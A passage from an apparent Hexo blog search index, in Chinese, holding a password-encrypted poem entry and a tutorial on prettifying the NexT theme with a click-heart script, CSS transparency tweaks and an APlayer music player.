    <content type="text"><![CDATA[是你吗？你的姓氏拼音 U2FsdGVkX1/MJDoJXL8Gfr84NzvPi2PWf9MYKg69lbAxjSdk5KjIcgY2+vbC1mgbXC6Gwj9ilxLbMjc1JRclAaavvMMZkI8Hr41m1UszEJUitDJg88FY5TOubcIYmU2oPqfDvigyebwmVmpYOMa2wKs1ePrFj3402weXqOpU0m2tWhkvp7A8iQ17Zwsm97dPdcg1G32+ThUPzLmAghkJmOHZXOWrhEfEtLd+2FTdFl192DYRuXx5jsh8j6ofy/zZupcElTXC5gfBp0uqJ1efvntXO49fdrivL6vNXQtXXdX1s2/mRsuP3UEgLqzrB/BjFzejZJ+OFWE272OVKip/GhfyEWFeqyQ6RcLwWRREndTUpn9uG8JAjxXjbIq+seIjHW6Rv0D/21ce0fkrGeLyrjctpabw8BA9Ekx51B7NbGuAhWEIDx1AX269jAM4k9mzoi9t9sAyfQJQAGqablTrvBKCb7Nes2qcbcbTtp0YzOn66ayF81aFaV/lYTZ2a+hqel0yr9xTtl/NK8W4R4pusU9uyt6SGzzakEL1qhWnaJuUPIFyW/WN7XrC2p44KeWFN6tu8Wq3mDgbndVcmKS/+NrFRFZKbWXte7hyMgDfWXG3yWTX3FXtUpFIvk3JQFOu0T9RDuXbg/H6jwhyLS5pEXwNvyCtBplfm5/wA8wuzrd60Wz72HMosY35c+EI1XPX7Jl9Nku7Ykpt8IkOpG7hNBttZOn431MwBngLClFpyMlfq8Vmq7JrQqF+TIR1rJyyyjqObhmaF3FFafeKvHyRjh/sS2aK/2lkBfCcBu0oipjSm3lfnEOpFXVDr5rx0ZlHkpPzMzjrE6PLFJAeJQ4kX+4X2qnwGqRyuvHeGD4qWqsaKyX00QA+pOruKezVWzxrE/SWk8cRwZB0IuqrHX5LTj/07jrrsx+JdY1goHnZ28KXZiv9FwMW8PPdJrpbzPJV9jDJ8rWCqjjsAZ0kxxb55vWjry8el3f1Nhpzgv7MPONh1clkOTNVSRS9haDgr/Yh6q6gw2UujvmR6ihfztKJ9ULp69U1q70YT4867zkY8gbGv2IDXnLOOgR+qqTLqqnXqZFg5eBK5obdWs0KiT6IaFK3WaD7+0vGEsi4JTkphOTtvJqyrBxn7o9Rm36tkPUHtRRjpEiZUJIy9coYa5muzmrAi6KiMh4D3fDUcBY7sFzQJWlkuoGUqFrgL0m5HsbnLTGHRlsPJ8ugFObE1/h58pXGgYrehhP7Nl2AwhmdDKBYS29omFHTH5ghel58iZBBcmmcG/CkdoOkQBFNNEaaYESpoGVBR41WvJg6Y+/CnA7BRhyUCDpugbXoi+NQULKFTVABiojW+tY/oJxtcUsxFEXPu5sUPEh2LelrCPxtX9FIfLZQMG7hDdNAz7REyWnRnQWiO6IKFKVjIHVrznt1QmzrXEhJZ4KNpdigx43uxZfyXS1QiqYTU0S4uJc7mhrCKQxE4eIo8/fcqYvlfmhqSHplNV/CCpZrHNabtESfXwzThBzSe1AsNeLu8cRm2j9+jv39g+K70Hv9Zf1b/yC5hS3EQNk9YFc/hBczGYZkjcn0xLJhLWlRSyuu65X8F5Ha6RzNk2LzlIoSZ/WdMXWS8CaInBCaUoeNR5BPW0fZtkQoqF1zPU6w7DBSfo3/ekB1tlcXgQyUf8BtnqpMX5pYTjjLY3AkaC1T4+YQ9j2E5UEfLCif13/UlOOLGA+6xoUyXXJcmAefB/JAsr2y0dH2r5zmib7tczwCQMfzm/f9D0BQo/eKL0V34O9gkQ+27P7FRTxWpEoTiXErY//MjId9TvrGKU5rWAlImk76H+TwjhWot5Mvi8YYgHoVtzNwWD8gM+ZLp8kpaKVIw3NMViqsO8CzlwaU+x5lA4ZYGtaD9uihOPvzu/DkT9zecligae6KfPg6pI+Xy7dX5yBvqdv3KBpPM6yqw0c/nWma+wGooc+UvKTjYDEglGaHhJ4K1wBh0nhL+biE2R+1hpWPSBquZokiJvChS7kTFVDwYV29bmcNqdQgWKu+AFkImRxa8JjlOwLdGWDeBAU77gAmWEv1XGKD+bw5ZGe/vOQxURC84DRL6eIc/scACa7pqanirYz2Mm0Us3GZZBA85F8qGYg22vUnvxp/NR7+AKgiZUrEzFrgRW5IiQwfInXmsDmdpErL56FxBupKPhuVJ3t/sDD+aaVW4VQ1dtOGgsdw7KDjYyZhweb73o9ZdTnJnNDN3nTFr1vZwHx6ND+/JWD0xAPIsnABL7tmebovHeHnJakB7oBF+zltOA4nLedFeDhbZDn00EoMc66G+P/ANnir8YfKrbkgjv1T6yAaaupywJuuW2DixiBuJleSR+4w8E4m3PEteHyBOsIl2VZn43v1+XTEN6i/oau3uO+5HLStgsiaRko0jRM8C+NkDEz82FU9l5cVe2/LDDhbfkXCFIJfsaNKRe4PiCx/miMy5BzilDppVY3NOI9oQg6nbvioDm/EdVtP32FSmrg9J8R1HmxfrXThdKRyjILqyImT7LSqztNortoetVPf7SvUmbItg7pQAShZOHk+dwjHKvetQeZFYVERpKPfuxpxYeP8+V4lTsLO0GI077LeuwLIkc00mOerFzdVN96CoCJo8sAX31cZUmA21FxWCWQkP39b/w8cV4AwV6Q4MJTspPwEqruHufPzwUzx4eozBM3Per5doFslEGWJWdH5ZQAzrG4cNweQTRfuvtF/1qJpzBte7LOdHvHizIN2tzXo7eDgUzFCAnSDJqRjC7rM1cytStCNCFBu1rAJtNAc2CnRNsY6CDyunwdPnFWRmobK3fb0lFYCTWl8JAekgWnCvM+39mCq8EZvjjFhezyXbUDEtSXuFOQmUlyNePjw3L60A6lAdXmrD4yR152oenfxzP8evOnPEwVGFF28pauVsmMde9IKs5YkJcVd34mmR8sJzcuaO2ufBoSs2FBqF9K74J8C1t3ftjbokyifxRWzApookWyvrS6/X0GnuqholWtMwBD8pFMlqezffy+yAkbmPB1T9Frxq+u+qi7QQ5iq3gHSzcLk5NpUWrs/uGZHf1DGHnt9jPreWnFedX5QUf1GQcPprTkENQ84O9fmuVaM7RWKdB4sO/DtCnFJDJSan26uSf6w9kcDi/hHZmLBaOKow4XKisQFnm/8eUX/VhviXD3GQHyWjBijlVtOVVUeuYQQPx3cLldoLPgvrIEFCb9mlDgoOcR2iYm6oc8LZLLkR/RP+6yQvcF1KxykoD7gIwO4Gj46xgJqVAsFqk4YKez3RuPZ6wwHrlnmfWFmtbmnsWo4QB8TwcrVkRfbzvCYp9o+ciFMRlkbz+opBhozGguf2Ohj0KkqLi0FPU+/f57asRwB6CypnNhqYl6O83bepw8ALQRnXUvCSFoKAEo+ukEbCkSmCqLVEw3RFR+p1VxWl4Ks8Qldy+G8kG79wOq4PE4ltbFn+qwdh5f0lfgc1DH4rDg8odwRCMRjTiEC5d6dPNbTPW5QAqOn7CTOFHV4acCadlKlEfJpODaHOeG4nbFvUPxYQrENzQu6Fzbf+6IsxnRvTvYQL5M83BWFhV15e2h8EA27cEg80WKyw4N2Rs/6QnDKGPIoY9n4SjZzV5RQEgBtB+zAWay3vrUoHFovPntWMrItbUEcYi4/vkK4Y36UtCxQIRm7lITxh1lyxbageAVSMIbu1ySE/vFM4nZ9OOaYoYYwK4SxeHHgptvy7IZFRwmW12VmNz4Khu5CJZRq3MJl6Vsl8rGtSYhoeOR35KICNbgJ1WQMr0UxTpZDgXv/dmWafGUNl6J6BdFFfryHpowr8heMF5FlSsKz1ye9wsN/NFz39NjIlAR37hBIyy/7artEhwzoCGxS4kycb10EtC2MfSKEwXxDsMaNL8FqTdtgutnalY2MVXn9sx3EXYu1J0DWBQTuYj6Ykb6CwglqWxSzpUe3czy+cse9ieoOjH4ilTm2cyeynalekIwXKR3gRcdRPxhAjdtr0HC1HubsG5deYf2XA8+s7DdsYLqqDLlBJFkjaN9ZXf7Yp7PA5VtdIFfjvrPIBR22msIsM/BqBk+dogv1SopIaf7j9K+P8TnhQQ0bn7aT0oBreYyPBP3RaF2f7mnp715KwS7JBDRijhdr6hg+GS2LqrZdeNuaWMYORA5eEvmXZVsxJ02jg/brE/h8SpqezojL4FB0wBHKpuZfiDt416r+YTJlKifwSJFvzOLGLgiS/Xbyk3RZPj1TVOgJnP1zo4T/rCuMl1hpfjgXayjWA5594mcdN/QTTyH69Wnw81SO++jGLpHzsFosWWJXUr7cSqvpnvhhSx1Zos9AKItaCu+ATwlRQQ1sMD+AMXTm9Y83Z1TDJf4Fq+hvhgzDoH731I31yDlCip5zGOVQDbONvF0v3jPmkORHk+hPC+EK2W7mul8ky6lHieTLPtqEcOkHWnGIYpD8NCPKnudJiDqPsC5xyR5uVvvTOu6PkEtyAWeA4GJTgDC7yxdsk7/g77+3/tuPUN/gaEbJdzmW2q0XCrN0FLat0BX/XKZt3jBY8i7SNbz7JBs0K2xaNY83HMN6WgRJY/aUqJ122ZWCzoxbpxWPhGdadNNNYb2TZ+C6INaWMcKwK34yfK+BF5RfLUDWOiIS95MjAb0SzzcXXukvFozutg95des9WdHxazY+/JX2Mqoj0DSlSgXG3wm5AR1LeYjmtb1h8lbPPoHaXE8vqWATEI12QgxU9c5tTWOx2QMDn8vcH9PQU2bbOm0VVfjLXf2CDr/s1k7Sg8rojwd9rbpj2VOUC7voEUhlkvBceU7fjQqhsFpwpFEpnyELP2i6IoKEZ4iM7uXYszQxrdoEEGNkY7CclCivQ/vJq2SJZgmOkHh3Lp0jKHIDzgDHiJH49u0BkUIQWBC/Ev6XcYGUY83pVDfSxSiSW5HTYzya8Ohl8O+42A5iVr18vCLAiiKbR52mBL/dEgvkzsXDwQ30/XhHBernSDyT06fLSA73Z9MZtcZjWa5L2GckPq2dpGUvv/57/BIiZ7gjuBtF9q6XLc/LMlaP3qIU1FK+T31qx3bSomC6aDYQQPV/2Fdpyul4yzNGyXaCxVWSpr3T8GBg1Gxmdi58T6avYpbhuQpCZEI8tcdRr9WLIDsZ9O/SWTTVqMR0IT9HJJzJXOYjikDIcZxMpj4cpjQTqunDfP02yMORtUSt/JUzeqQDkeQktf0MSoFbLqvCHcPT9YYAI1T3upSzQasKH7Zme3GGWj0jDMUzqIE3D7CIzboFddl8sdCyyotZTVBSxo6nbPnbMK/UPrvPQ+yBLK6FettLYl/ZPkDG6wqexc8eUGk9x6F5Ues9KFXh9TY/qlzAIwDHiONB67rLaxSviyUJOSMZ0WVtUQab6fpzALzu9wHOii/eAsHQ7JxFXZgsL2h4kP5LdbTpTfWB6JEwREDq/6hT6+1tJa3zta/6VL/C2ytqUoo2XtBcWqPYnGt9NcmQSAaU3lSkmcbOH9n5lojBXOOGFpenm5GOFu5zXXtgD/fxsRor6cZlpJ1+OOXGAS4sAzG6nRik1FrrHjENgEOuIXhp70LlLh6M58mGdNB83mBGi6VXqihmZD29efVuFk74hrqZFaGZUDn1MGm4JX1IhoMbVE8OWlyGqo9XsjtIDKYbLActcnJ0nVepJuPbrlG/3z6Sx/cl2M2AK1Wv1gzAVoFZCS75Zgf/1QV9AA4nkxkhnaG/+Jtq9Z9Kg/ztS5a7wJQxdZr2mUZmgmJX4j5wwwbyGQDN3ZYOEsYMkds41zyxJnL3Syh3aobCp/74EZLzlEQi1TPyzJjj7Phbda0aGRxrRBGggK1k/KApu8MjMAvLlsLXWR7mBJLyW5aNAD2MrrttdpoKjh61xc2OOaR/s7Feh2KkrR4gUrf8iPmy7bnfT8aidgibtwpwncpKS/OieRyu6WMyGyM9VGzhi3FLNa3Frvr/LmRYBNN9tIWw6FMr2CjwIeONN5/7qY19Lk0FcSQsfdhM/vUz6NBlpS7x80I6Me+0V4s2PogERSg97Gr2iZNYM7+Kz7q/Ki8SSNTeByrejZexh0AJEghsd8MG1M6O4eTumIVo/7xl96WJhWJYvzhktr8n8Sgy/KdswRsIrjWyJzz/EAZwAfMQiQ3SsXS4ZK2JUkM50xiHeqDTJk/LaOrgA44ahRVGERUuKctJxJ0sl38GheWAGCmFs0Q+Cp5W69HaLkej+LOF/K9gXiP4RTDEis7HdQABmcVFR8ls/82WWicoyeVDb+i3WVPwaa34ObUnCivL65bdKzq6gw24fgh7sTm41Pgm+U9FMNCtzaMs6im5UPbSTcn4fieluh/c6CeJlvS7jY9fO6oUTKAd6hWzTF76dgdC5sH15sUciUYh5xSKGBtF9Akvd/6LCoYdvz3HjcZLYGNByqw4etcciOmEhv7VgSf94xamPTzx4K2sTpVEOrAR1yUp1ku80wJQQXRCLWl6TKID3GqGScskyT4HaC6dOn5MpXSBTkjqsoLGn0npdv3/6JOqp7+MSjZBlzcNR7DDnqLztDtv04LEDLlaCgKIFcSCMPInkWRflEJgPycM+GzfEPcywZvf7gT9LxYiOmdF3t7U088QaVisSBG9CODoJJcoveWiayOHjgumDSs9RbxVVqQUuJxSC+OHJpGB591QcsQiyyL/nhOH92FN3vazoI6cE30RzQ3qQWtMPcy5BcDSgGlmVKglJj+cz61k4IXXYPzC7zXZFBdDCPRO1+eDCGhXje4FXDYf7xHIWNQC1RLkjwCvuZS0BS7QnWaCXD7eC9USugmjH0P6NLq1VPUdMjTq7ZCg7FZSsPgeMkqq01kXSBSJ8bdn0hBNk9a1KvrVpRlZjegE//4zalI4GVRDX0Rd53Bt/g1AWsHhoV74Aj7LwHFjP/pO0xD6gammn0uhkmvMAwNpFNpAI8W9a24X6c8Xn6P2K4YBqOF3heYjNv3RCww9G8TmF5oO/2kravv2rAc/EJifbC7i3V30b/sINllOUYHjUunX80yEP9ThVNu23HZ9uDPXwGcWu7wzPqEX3tLb3qztwbC7bG33K/ApOzl6yKFuaVsljLv3PL8385jBGcSFZ68ONxdylihFXzHduB46pGsceUYkqIweI7ZeLUrdirn9D+6lgD3kpJrp7N93Kttg7a5R9SlDFxywN/50If4RmmtfsO6M10KpXXV4RbSxHFQURhj7gzY3Ku09+aG/MUsn14t/ZhZn1zXpfNW7R0E+NPQze69uE2WYH71X86dEWFkh0Owcx59CY5n0Spqni8rwe7KH+MHHsBTBcV6Cn2V1UQcSDRLW3V2kEm0MNUVb43gs9PTQK8+QDVqUlrAzQiAm9WGIDT0tzTKe1HwFZiKQ8ue4pRYjsHGEmqjn16oAu+iVgOLyaWhpTeaTY/4eQHlkze7ry1vJX+VMUtgCubsmD+i8qAWEE7NLV318KThhsOPqOUXZCeUAZHWmGkcw946K8VVGM4BwcJO8Z49CBw1XlgevzhDeOvsIdbK0mfmZLTxWc/zUG46/JvBK2j+92vKBeZbQWk9I0Gv0yyOy4lwprh2HiC+ITBq0E9MV7s1NIVKZzVwfOi1ccKz7wAXtPLb3NUpOLfHgAdZgvyaixaYsdsLTb6scf8vhpHLo+jE7+5WneXpIHY7pgCB5bCc1p4R7CUBH2kPO5U+J8vbV9J5vp3I2ZD1myvMqoDJF6R7duk9tqku+YSfh8wAUtjPFeJ1ECrW3uak1ss2hO11A//RAVJwmyWXpAu/61GO08IPdel8DKbhktzQSmHvXJRr0RbIf6mqHmwFKIaXmciCBfP7DJwozYfKDWEAc1dOfjMahGi70FgE2Y+xC5Q2yN4EZQ+Pw89EJ]]></content>
      <categories>
        <category>诗和远方</category>
        <category>诗</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Blog美化]]></title>
    <url>%2Farchives%2F11804e57.html</url>
    <content type="text"><![CDATA[上篇文章对配置进行了记录，本篇文章记录nexT的美化工作。效果图呈现：前言通过上一章Blog更新&配置文件详解的内容基本能满足大部分的需求，如果想要逼格高一点、深度优化，可以对里面的一些文件（swig、js等）进行新增、修改等。美化点击特效点击特效可通过JS来实现，大家可以选择自己喜欢的特效，调用JS即可。我选择的是点击桃心特效，js源码如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566(function(window,document,undefined)&#123; var hearts = []; window.requestAnimationFrame = (function()&#123; return window.requestAnimationFrame || window.webkitRequestAnimationFrame || window.mozRequestAnimationFrame || window.oRequestAnimationFrame || window.msRequestAnimationFrame || function (callback)&#123; setTimeout(callback,1000/60); &#125; &#125;)(); init(); function init()&#123; css(".heart&#123;width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);&#125;.heart:after,.heart:before&#123;content: '';width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: absolute;&#125;.heart:after&#123;top: -5px;&#125;.heart:before&#123;left: -5px;&#125;"); attachEvent(); gameloop(); &#125; function gameloop()&#123; for(var i=0;i&lt;hearts.length;i++)&#123; if(hearts[i].alpha &lt;=0)&#123; document.body.removeChild(hearts[i].el); hearts.splice(i,1); continue; &#125; hearts[i].y--; hearts[i].scale += 0.004; hearts[i].alpha -= 0.013; hearts[i].el.style.cssText = "left:"+hearts[i].x+"px;top:"+hearts[i].y+"px;opacity:"+hearts[i].alpha+";transform:scale("+hearts[i].scale+","+hearts[i].scale+") rotate(45deg);background:"+hearts[i].color; &#125; requestAnimationFrame(gameloop); &#125; function attachEvent()&#123; var old = typeof window.onclick==="function" &amp;&amp; window.onclick; window.onclick = function(event)&#123; old &amp;&amp; old(); createHeart(event); &#125; &#125; function createHeart(event)&#123; var d = document.createElement("div"); d.className = "heart"; hearts.push(&#123; el : d, x : event.clientX - 5, y : event.clientY - 5, scale : 1, alpha : 1, color : randomColor() &#125;); document.body.appendChild(d); &#125; function css(css)&#123; var style = document.createElement("style"); style.type="text/css"; try&#123; style.appendChild(document.createTextNode(css)); &#125;catch(ex)&#123; style.styleSheet.cssText = css; &#125; document.getElementsByTagName('head')[0].appendChild(style); &#125; function randomColor()&#123; return "rgb("+(~~(Math.random()*255))+","+(~~(Math.random()*255))+","+(~~(Math.random()*255))+")"; &#125;&#125;)(window,document);将上面源码存放为click.js文件内，将click.js文件放在/hexo/themes/next/source/js/src\路径下。打开 /hexo/themes/next/layout/_layout.swig 文件， 在head标签内最后位置添加以下代码：1&lt;script type="text/javascript" src="/js/src/click.js"&gt;&lt;/script&gt;修改文章内链接文本样式修改文件/themes/next/source/css/_common/components/post/post.styl，在末尾添加如下css样式：12345678910.post-body p a&#123; color: #0593d3; border-bottom: none; border-bottom: 1px solid #0593d3; &amp;:hover &#123; color: #fc6423; border-bottom: none; border-bottom: 1px solid #fc6423; &#125;&#125;文章底部标签样式修改模板/hexo/themes/next/layout/_macro/post.swig，搜索 rel=”tag”&gt;#，将 # 换成或者可以从这里自己挑。1&lt;a href="&#123;&#123; url_for(tag.path) &#125;&#125;" rel="tag"&gt;&lt;i class="fa fa-tag"&gt;&lt;/i&gt;&#123;&#123; tag.name &#125;&#125;&lt;/a&gt;文章末尾添加结束标记在路径/hexo/themes/next/layout/_macro/中新建 passage-end-tag.swig 文件,并添加以下内容：12345&lt;div&gt; &#123;% if not is_index %&#125; &lt;div style="text-align:center;color: #ccc;font-size:14px;"&gt;-------------本文结束&lt;i class="fa fa-heart-o" aria-hidden="true"&gt;&lt;/i&gt;感谢您的阅读-------------&lt;/div&gt; &#123;% endif %&#125;&lt;/div&gt;接着打开/hexo/themes/next/layout/_macro/post.swig文件，post-footer之前添加如下代码（post-footer之前两个DIV）：12345678910111213141516171819&lt;div&gt; &#123;% if not is_index %&#125; &#123;% include 'passage-end-tag.swig' %&#125; &#123;% endif %&#125; &lt;/div&gt; &#123;% if (theme.alipay or theme.wechatpay or theme.bitcoin) and not is_index %&#125; &lt;div&gt; &#123;% include 'reward.swig' %&#125; &lt;/div&gt; &#123;% endif %&#125; &#123;% if theme.post_copyright.enable and not is_index %&#125; &lt;div&gt; &#123;% include 'post-copyright.swig' with &#123; post: post &#125; %&#125; &lt;/div&gt; &#123;% endif %&#125; &lt;footer class="post-footer"&gt;打开主题配置文件/hexo/themes/next/_config.yml,在末尾添加：123# 文章末尾添加结束标记passage_end_tag: enabled: true侧边栏作者头像修改把侧边栏头像变成圆形，并且鼠标停留在上面发生旋转效果，修改/hexo/themes/next/source/css/_common/components/sidebar/sidebar-author.styl:1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374.site-author-image &#123; display: block; margin: 0 auto; padding: $site-author-image-padding; max-width: $site-author-image-width; height: $site-author-image-height; border: $site-author-image-border-width solid $site-author-image-border-color; /* 头像圆形 */ border-radius: 80px; -webkit-border-radius: 80px; -moz-border-radius: 80px; box-shadow: inset 0 -1px 0 #333sf; /* 设置循环动画 [animation: (play)动画名称 (2s)动画播放时长单位秒或微秒 (ase-out)动画播放的速度曲线为以低速结束 (1s)等待1秒然后开始动画 (1)动画播放次数(infinite为循环播放) ]*/ -webkit-animation: play 2s ease-out 1s 1; -moz-animation: play 2s ease-out 1s 1; animation: play 2s ease-out 1s 1; /* 鼠标经过头像旋转360度 */ -webkit-transition: -webkit-transform 1.5s ease-out; -moz-transition: -moz-transform 1.5s ease-out; transition: transform 1.5s ease-out;&#125;img:hover &#123; /* 鼠标经过停止头像旋转 -webkit-animation-play-state:paused; animation-play-state:paused;*/ /* 鼠标经过头像旋转360度 */ -webkit-transform: rotateZ(360deg); -moz-transform: rotateZ(360deg); transform: rotateZ(360deg);&#125;/* Z 轴旋转动画 */@-webkit-keyframes play &#123; 0% &#123; -webkit-transform: rotateZ(0deg); &#125; 100% &#123; -webkit-transform: rotateZ(-360deg); &#125;&#125;@-moz-keyframes play &#123; 0% &#123; -moz-transform: rotateZ(0deg); &#125; 100% &#123; -moz-transform: rotateZ(-360deg); &#125;&#125;@keyframes play &#123; 0% &#123; transform: rotateZ(0deg); &#125; 100% &#123; transform: rotateZ(-360deg); &#125;&#125;.site-author-name &#123; margin: $site-author-name-margin; text-align: $site-author-name-align; color: $site-author-name-color; font-weight: $site-author-name-weight;&#125;.site-description &#123; margin-top: $site-description-margin-top; text-align: $site-description-align; font-size: $site-description-font-size; color: $site-description-color;&#125;背景&amp;透明度美化背景图片在/hexo/themes/next/source/css/_custom文件夹下打开custom.styl文件，往里面添加以下代码：1234567body&#123; background:url(图片链接); background-size:cover; background-repeat:no-repeat; background-attachment:fixed; background-position:center; &#125;文字背景色设置在/hexo/themes/next/source/css/_custom文件夹下打开custom.styl文件，往里面添加以下代码：12345.content &#123; border-radius: 10px; margin-top: 60px; background:rgba(颜色rgb,透明度) none repeat scroll !important; &#125;代码块美化这块工作让我头痛了很久！！！代码块透明度设置，在/hexo/themes/next/source/css/_custom文件夹下打开custom.styl文件，往里面添加以下代码:12345678910111213141516171819202122232425262728// 单行代码块设置code &#123; background:rgba(241,241,241,0.3); margin: 2px;&#125;// 多行代码块的自定义样式.highlight&#123; background:rgba(241,241,241,0.3);&#125;.highlight, pre &#123; margin: 5px 0; padding: 5px; border-radius: 3px; background:rgba(241,241,241,0.3);&#125;.highlight, td&#123; background:rgba(241,241,241,0.1)&#125;.highlight, gutter pre&#123; background:rgba(241,241,241,0.1)&#125;.highlight, code, pre &#123; border: 1px solid #d6d6d6; background:rgba(241,241,241,0.3)&#125;table&gt;tbody&gt;tr:nth-of-type(odd)&#123; background:rgba(241,241,241,0.1)&#125;注释/hexo/themes/next/source/css/_components/highlight/highlight.styl文件第81、88行：1// background-color: $highlight-gutter.bg-color这一块修改学习到了一个小技巧，通过chrome的F12→Elements→Styles进行一层层修改测试，快速找到需要修改的地方。Ps：这里要谢谢我的同事-C！播放器安装APlayer插件安装Aplayer播放器，在/hexo目录执行npm install aplayer --save。安装完后在node_modules目录下找到APlayer.min.js文件，将其复制到theme/next/source/js/src/目录下。在你想要加入音乐播放器的地方插入以下代码，这里我把它放到了侧边栏。打开theme/next/layout/_custom/文件夹下的sidebar.swig文件，向其中添加以下代码：1234567891011121314151617181920212223242526272829303132333435363738&lt;div id="player1" class="aplayer" data-id="2058781355" data-server="netease" data-type="playlist" data-mode="circulation"&gt;&lt;/div&gt;&lt;script src="/js/src/APlayer.min.js"&gt;&lt;/script&gt;&lt;script type="text/javascript"&gt;var ap = new APlayer(&#123; element: document.getElementById('player1'), // Optional, player element narrow: false, // Optional, narrow style autoplay: true, // Optional, autoplay song(s), not supported by mobile browsers showlrc: 3, // Optional, show lrc, can be 0, 1, 2, see: ###With lrc mutex: true, // Optional, pause other players when this player playing theme: '#e6d0b2', // Optional, theme color, default: #b7daff mode: 'circulation', // Optional, play mode, can be `random` `single` `circulation`(loop) `order`(no loop), default: `circulation` preload: 'metadata', // Optional, the way to load music, can be 'none' 'metadata' 'auto', default: 'auto' listmaxheight: '513px', // Optional, max height of play list music: [ &#123; title: '化身孤岛的鲸', // Required, music title author: '不才', // Required, music author url: '/music/不才 - 化身孤岛的鲸.mp3', // Required, music url pic: '/music/不才 - 化身孤岛的鲸.jpg', // Optional, music picture lrc: '/music/不才 - 化身孤岛的鲸.lrc' // Optional, lrc, see: ###With lrc &#125;, &#123; title: '我的一个道姑朋友', // Required, music title author: '以冬', // Required, music author url: '/music/以冬 - 我的一个道姑朋友.mp3', // Required, music url pic: '/music/以冬 - 我的一个道姑朋友.jpg', // Optional, music picture lrc: '/music/以冬 - 我的一个道姑朋友.lrc' // Optional, lrc, see: ###With lrc &#125;, &#123; title: '七月上', // Required, music title author: 'Jam', // Required, music author url: '/music/Jam - 七月上.mp3', // Required, music url pic: '/music/Jam - 七月上.jpg', // Optional, music picture lrc: '/music/Jam - 七月上.lrc' // Optional, lrc, see: ###With lrc &#125; ]&#125;);&lt;/script&gt;自定义播放器样式包含颜色更改，列表歌曲信息的排版修改。在/hexo/theme/next/source/css/_custom文件夹下打开custom.styl文件，往里面添加以下代码：1234567891011121314151617181920// 播放器设置.aplayer-list&#123; height: 100px !important;&#125;.aplayer-list ol li:hover &#123; /*列表悬停颜色*/ background:rgba(255,255,255,0.3) none repeat scroll !important;&#125;.aplayer-list ol li &#123; /*列表底色*/ background:rgba(250,252,123,0.3);&#125;.aplayer-list-light &#123; /*列表播放歌曲颜色*/ background:rgba(97,217,101,0.3) none repeat scroll !important;&#125;#player1 &#123; /*边框样式*/ border-radius: 6px; div,ol &#123;border-radius: 6px;&#125; &#125;#player1 *&#123;color: #696969;&#125; /*字体颜色*//*列表歌曲信息的排版*/.aplayer-list-index&#123;float:left;&#125;.aplayer-list-title&#123;float:left;&#125;.aplayer-list-author&#123;float:right;&#125;音乐播放控制边栏将APlayer-Controler放入/hexo/themes/next/source/js/src/目录下。在/hexo/themes/next/layout/_custom/文件夹下新建一个myapcontroler.swig的文件。向其中添加以下代码：1234567891011121314151617181920212223242526&lt;script src="/js/src/APlayer-Controler.js"&gt;&lt;/script&gt;&lt;div id="AP-controler"&gt;&lt;/div&gt;&lt;script type="text/javascript"&gt;var myapc=new APlayer_Controler(&#123; APC_dom:$('#AP-controler'), aplayer:ap, //此为绑定的aplayer对象 attach_right:true, position:&#123;top:'300px',bottom:''&#125;, fixed:true, btn_width:100, btn_height:120, img_src:['http://oty1v077k.bkt.clouddn.com/bukagirl.jpg', 'http://oty1v077k.bkt.clouddn.com/jumpgirl.jpg', 'http://oty1v077k.bkt.clouddn.com/pentigirl.jpg', 'http://oty1v077k.bkt.clouddn.com/%E8%90%8C1.gif'], img_style:&#123;repeat:'no-repeat',position:'center',size:'contain'&#125;, ctrls_color:'rgba(173,255,47,0.8)', ctrls_hover_color:'rgba(255,140,0,0.7)', tips_on:true, tips_width:140, tips_height:25, tips_color:'rgba(255,255,255,0.6)', tips_content:&#123;&#125;, timeout:30 &#125;);&lt;/script&gt;在/hexo/themes/next/layout文件夹下打开_layout.swig文件，在前添加以下代码：1&#123;% include '_custom/myapcontroler.swig' %&#125;侧边栏美化在/hexo/themes/next/layout/_macro文件夹下打开sidebar.swig文件，找到以下代码行的位置：1&lt;nav class="site-state motion-element"&gt;在上面添加以下代码：123456789101112&lt;!--my custom code begin--&gt;&lt;script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.0/jquery.min.js"&gt;&lt;/script&gt;&lt;script src="https://cdnjs.cloudflare.com/ajax/libs/velocity/1.5.0/velocity.min.js"&gt;&lt;/script&gt;&lt;script type="text/javascript"&gt; $("#sidebar").hover(function()&#123; $("#mydivshow").velocity('stop').velocity(&#123;opacity: 1&#125;); &#125;,function()&#123; $("#mydivshow").velocity('stop').velocity(&#123;opacity: 0&#125;); &#125;);&lt;/script&gt;&lt;div id="mydivshow" class="mydivshow"&gt;&lt;!--my custom code end--&gt;然后找到代码行：1234&lt;/section&gt;&#123;% if display_toc and toc(page.content).length &gt; 1 %&#125;&lt;!--noindex--&gt;&lt;section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active"&gt;在此的上方添加一个，如下所示：12345678&lt;!--my custom code begin--&gt;&lt;/div&gt;&lt;!--my custom code end--&gt;&lt;/section&gt;&#123;% if display_toc and toc(page.content).length &gt; 1 %&#125;&lt;!--noindex--&gt; &lt;section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active"&gt; &lt;div class="post-toc"&gt;首页隐藏文章修改next主题文件夹下的layout中的index.swig文件，将1post_template.render(post, true)修改成:123&#123;% if post.visible !=='hide' %&#125; &#123;&#123; post_template.render(post, true) &#125;&#125;&#123;% endif %&#125;在Front-matter添加visible字段即可，当visible字段为hide时会在首页隐藏文章。1visible: hide版权透明度在/hexo/themes/next/source/css/_custom文件夹下打开custom.styl文件，往里面添加以下代码:1234// 版权样式设置.post-copyright&#123; background:rgba(241,241,241,0.1)&#125;标签透明度在/hexo/themes/next/source/css/_custom文件夹下打开custom.styl文件，往里面添加以下代码:123456// 标签样式设置.posts-expand .post-tags&#123; a &#123; background:rgba(241,241,241,0.1) &#125;&#125;总结自己搞不定，资料查不出来的情况下，问问其他人有时候会有意想不到的效果；CSS可以通过 